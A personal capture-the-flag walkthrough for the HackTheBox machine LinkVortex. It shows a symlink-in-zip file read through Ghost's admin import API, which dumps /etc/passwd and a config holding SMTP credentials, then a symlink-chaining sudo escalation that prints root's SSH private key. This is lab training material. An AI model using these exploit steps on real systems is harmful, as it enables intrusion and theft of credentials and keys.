## init

### Creating manual zip
```bash

ln -s /etc/passwd content/images/edibauer.jpg # creating symbolic link
zip -r -y poc.zip content/ # creating zip fila

```

### Using GHost API
```bash
curl http://linkvortex.htb/ghost/api/admin/db

# ans
{"errors":[{"message":"Authorization failed","context":"Unable to determine the authenticated user or integration. Check that cookies are being passed through if using session authentication.","type":"NoPermissionError","details":null,"property":null,"help":null,"code":null,"id":"59a1e310-1e1a-11f0-a754-9b863ffcb54e","ghostErrorCode":null}]}

```

```bash
# We need to get cookie session
name: ghost-admin-api-session
value: s%3AwlLZm8zUrckVKRMFFbUB4wClvANKEAc2.QB6EgjJiqvETIknT3Pc33EsaFOXsWSou7KhVrPpVzsU
```

![alt text](image.png)

```bash
# SAve cooki into terminal
cookie='ghost-admin-api-session=s%3AwlLZm8zUrckVKRMFFbUB4wClvANKEAc2.QB6EgjJiqvETIknT3Pc33EsaFOXsWSou7KhVrPpVzsU'

echo $cookie

curl http://linkvortex.htb/ghost/api/admin/db -b "$cookie"
curl http://linkvortex.htb/ghost/api/admin/db -b "$cookie" -v # to view verbose

curl http://linkvortex.htb/ghost/api/admin/db/ -b "$cookie" -v # Adding slash to paht at final

curl http://linkvortex.htb/ghost/api/admin/db/ -F 'importfile=@poc.zip' \-b "$cookie" # Sendign poc.zip file

curl http://linkvortex.htb/content/images/edibauer.jpg # curl uploaded path
#ans
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash

```

### Applying to the machine
```bash
# We need to read this file ofrm hte machine
/var/lib/ghost/config.production.json # From git project (use git-dumper) and git diff commando to see differences

ln -s /var/lib/ghost/config.production.json content/images/pwned.jpg # Creating symbolic file

zip -r -y poc.zip cont/ # Creating zip file

curl http://linkvortex.htb/ghost/api/admin/db/ -F 'importfile=@poc.zip' \-b "$cookie" # Send zip file into the api. FIle must be named poc

curl http://linkvortex.htb/content/images/pwned.jpg # View results
# ans
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

# Enter via ssh with results credentials
ssh bob@10.10.11.47
pass: fibber-talented-worth
```

### Bob user
```bash
# VIew flag
b55d0681e608ed13307d2c33f8dbc2a4

# View sudo lista
sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png


```

### clean_symlink
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
The sccript oinly funcitoins with symbolick link ina a .png extension files. If the link refersto etc or root, scriot removes the file automatically. We need to create a link that refers to another link

```bash
ln -s /root/root.txt texs.txt
ln -s /home/bob/test.txt test.png

sudo -u root /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
# ans
Link found [ test.png ] , moving it to quarantine

CHECK_CONTENT=true sudo -u root /usr/bin/bash /opt/ghost/clean_symlink.sh test.png # Changign the value of CHECK_CONTENT to show answer

# DO it again
ln -s /home/bob/test.txt test2.png

CHECK_CONTENT=true sudo -u root /usr/bin/bash /opt/ghost/clean_symlink.sh test2.png
#  ans
8aad1f3b6c90fd70c94a22d75e7fbbe0

```

### Privilege scalation
```bash
rm test.txt # currently created

ln -s /root/.ssh/id_rsa test.txt # pointing to id_rsa root user
ln -s /home/bob/test.txt test.png

# ans
lrwxrwxrwx 1 bob  bob   17 Apr 20 12:58 Cu3xsv4Y -> /root/.ssh/id_rsa
lrwxrwxrwx 1 bob  bob   17 Apr 20 13:00 Cu8EQojj -> /root/.ssh/id_rsa
lrwxrwxrwx 1 bob  bob   17 Apr 20 17:57 file.txt -> /root/.ssh/id_rsa
-rw-rw-r-- 1 bob  bob 2671 Apr 20 18:04 ssh_key
lrwxrwxrwx 1 bob  bob   18 Apr 20 20:27 test.png -> /home/bob/test.txt
lrwxrwxrwx 1 bob  bob   17 Apr 20 20:26 test.txt -> /root/.ssh/id_rsa
-rw-r----- 1 root bob   33 Apr 20 06:02 user.txt

CHECK_CONTENT=true sudo -u root /usr/bin/bash /opt/ghost/clean_symlink.sh test.png

#ans
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

cd /tmp
nano id_rsa

chmod 600 id_rsa # only bob can manage
ssh -i id_rsa root@localhost

cat root.txt

8aad1f3b6c90fd70c94a22d75e7fbbe0
```


